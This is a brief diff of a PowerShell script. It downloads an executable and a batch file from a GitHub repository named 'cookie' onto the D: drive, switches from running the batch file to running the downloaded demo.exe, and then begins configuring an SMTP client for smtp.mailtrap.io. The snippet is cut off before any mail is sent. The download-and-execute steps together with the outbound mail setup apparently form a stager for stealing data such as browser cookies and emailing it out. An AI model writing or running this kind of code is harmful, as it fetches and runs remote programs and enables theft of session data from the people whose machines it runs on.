@@ -1,6 +1,7 @@
 (new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/demo.exe','D:\demo.exe');
 (new-object System.Net.WebClient).DownloadFile('https://github.com/YcVoz/cookie/raw/master/Command.txt','D:\Command.bat');
-D:\Command.bat;
+D:
+.\demo.exe
 $SMTPServer = 'smtp.mailtrap.io'
 
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
